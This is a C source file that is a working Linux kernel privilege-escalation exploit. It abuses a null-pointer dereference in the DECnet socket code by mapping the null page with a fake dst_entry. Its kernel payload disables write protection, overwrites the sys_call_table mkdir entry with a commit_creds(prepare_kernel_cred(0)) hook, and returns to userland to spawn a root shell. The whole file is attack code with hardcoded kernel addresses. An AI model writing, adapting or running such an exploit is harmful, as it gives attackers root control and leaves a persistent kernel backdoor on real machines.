#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include "dn.h"
#include "dnetdb.h"

#define MAP_ANONYMOUS	0x20

struct dst_entry {
    unsigned char       *dev;
    unsigned long       ops;
    unsigned long       _metrics;
    unsigned long       expires;
    unsigned long       __pad1;
    void                (* input)();
    void                (* output)();
};

unsigned long user_cs, user_ss, user_rflags, user_sp;
unsigned long gfp_atomic = 0xa20;

void save_state() {
    __asm__ __volatile__ (
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
    puts("[*] Saved state");
}

void pop() {
    puts("[*] Returned to userland, how about creating a dir?");
    syscall(SYS_mkdir, "/tmp/pwn", 0700);
    system("/bin/sh");
}

unsigned long user_rip = (unsigned long) pop;

void syscall_hook() {
    __asm__ __volatile__ (
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff81092c30;"   // prepare_kernel_cred
        "xor rdi, rdi;"
        "call rax; mov rdi, rax;"
        "movabs rax, 0xffffffff81092990;"   // commit_creds
        "call rax;"
        "xor rax, rax;"                     // restore stack frame
        "add rsp, 0x8;"
        "ret;"
        ".att_syntax;"
    );
}

void input() {
    unsigned char a[3] = {0x68, 0x75, 0x68}; 
}

void *hook = &syscall_hook;

// Symbols for ubuntu-stable-kinetic with custom .config, -no-pie :(
void output() {
    __asm__ __volatile__ (
        ".intel_syntax noprefix;"
        "mov rdi, 0x1000;"
        "mov rsi, gfp_atomic;"
        "call 0xffffffff815cd3b0;"      // kzalloc(0x1000, GFP_ATOMIC)
        "mov r13, rax;"                 // r13 = hook
        "mov rdi, rax;"
        "mov rsi, hook;"
        "mov rdx, 128;"
        "call 0xffffffff81cf6b20;"      // memcpy(rax, hook, enough)
        "mov rbx, 0xfffffffffffff000;"
        "mov rdi, r13;"
        "and rdi, rbx;"
        "mov rsi, 1;"
        "call 0xffffffff8105f7f0;"      // set_memory_x(hook, 1)
        "mov r14, 0xffffffff82200280;"  // r14 = sys_call_table
        "mov rbx, 0xfffffffffffff000;"
        "mov rdi, r14;"
        "and rdi, rbx;"
        "mov rsi, 1;"
        "call 0xffffffff8105f8a0;"      // set_memory_rw(sys_call_table, 1)
        "mov rdi, 0x80040033;"
        "mov cr0, rdi;"
        "mov [r14+83*8], r13;"          // sys_call_table[SYS_mkdir] = hook
        "swapgs;"                       // jmp pop
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}


int main() {
    struct sockaddr_dn sockaddr;
    int sockfd;

    // must be root to set local addr
    // echo -n "1.10" > /proc/sys/net/decnet/node_address
    char addrname[5] = "1.10";
    FILE *fp = fopen("/proc/sys/net/decnet/node_address", "w");
    if (fp == NULL) {
        puts("[*] Starting as non-root");
    } else {
        fprintf(fp, "%s", addrname);
        fclose(fp);
    }
    struct dst_entry *null_page = (struct dst_entry *) mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
    if (null_page == MAP_FAILED) {
        perror("[!] mmap");
        exit(-1);
    }

    unsigned char *dev = (unsigned char *) malloc(0x8c0);  // sizeof(net_device)
    if (dev == NULL) {
        perror("[!] malloc");
        exit(-1);
    }
    memset(dev, 0x41, 0x8c0);

    null_page->dev = dev;
    null_page->ops = 0xdeadc0dedeadc0de;
    null_page->_metrics = 0xdeadc0dedeadc0de;
    null_page->expires = 0xdeadc0dedeadc0de;
    null_page->__pad1 = 0xdeadc0dedeadc0de;
    null_page->input = input;

    null_page->output = output;

    static struct dn_naddr addr;
    struct nodeent dp;
    char *nodename = "turtle";
    addr.a_addr[0] = 10 & 0xFF;
    addr.a_addr[1] = (1 << 2) | ((10 & 0x300) >> 8);
    dp.n_addr = (unsigned char *)&addr.a_addr;
    dp.n_length = 2;
    dp.n_name = nodename;
    dp.n_addrtype = AF_DECnet;

    if ((sockfd = socket(AF_DECnet, SOCK_SEQPACKET, DNPROTO_NSP)) == -1) {
        perror("[!] socket");
        exit(-1);
    }

    sockaddr.sdn_family = AF_DECnet;
    sockaddr.sdn_flags  = 0x00;
    sockaddr.sdn_objnum  = DNOBJECT_MIRROR;
    sockaddr.sdn_objnamel  = 0x00;
    memcpy(sockaddr.sdn_add.a_addr, dp.n_addr, 2);

    save_state();

    puts("[*] Triggering NPD");
    if (connect(sockfd, (struct sockaddr *)&sockaddr, sizeof(sockaddr)) < 0) {
        perror("[!] socket");
        exit(-1);
    }

    puts("[!] Shouldn't get here");
    return 0;
}
